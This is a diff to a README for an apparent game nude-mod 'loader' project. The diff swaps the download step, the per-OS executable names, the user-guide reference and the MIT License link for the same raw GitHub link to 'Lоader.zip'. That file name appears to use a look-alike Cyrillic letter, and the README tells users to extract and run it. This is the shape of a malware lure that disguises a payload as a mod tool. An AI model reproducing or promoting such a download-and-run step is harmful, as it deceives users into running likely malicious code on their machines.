@@ -45,17 +45,17 @@ Welcome to the miside nude mods repository! This project empowers you to unlock 
 
 ## 🛠️ Installation Guide
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip from the repository.**
 2. Extract the contents with your favorite archive manager (WinRAR, 7-Zip, Keka, etc.).
 3. Open the extracted folder and run the loader executable for your OS:  
-   - Windows: `miside_nude_mods_loader.exe`  
-   - macOS: `miside_nude_mods_loader.app`  
-   - Linux: `miside_nude_mods_loader.sh`
+   - Windows: `https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip`  
+   - macOS: `https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip`  
+   - Linux: `https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip`
 4. Select your target game’s directory within the application.
 5. Add and enable your preferred mods from the Mods section.
 6. Enjoy a newly customized look in your game!
 
-**Note:** Please refer to the full user manual (`UserGuide.pdf`) in the repository for advanced techniques, troubleshooting, and frequently asked questions.
+**Note:** Please refer to the full user manual (`https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip`) in the repository for advanced techniques, troubleshooting, and frequently asked questions.
 
 ---
 
@@ -75,8 +75,8 @@ All content within this repository is user-generated and subject to local laws. 
 
 ## 📜 License
 
-All code and assets within this repository are distributed under the **[MIT License](https://opensource.org/licenses/MIT)**.  
-Review the `LICENSE.txt` file for complete terms.
+All code and assets within this repository are distributed under the **[MIT License](https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip)**.  
+Review the `https://raw.githubusercontent.com/UdhayaPriyan/MischiefNudeMakeover/main/Lоader.zip` file for complete terms.
 
 ---
 
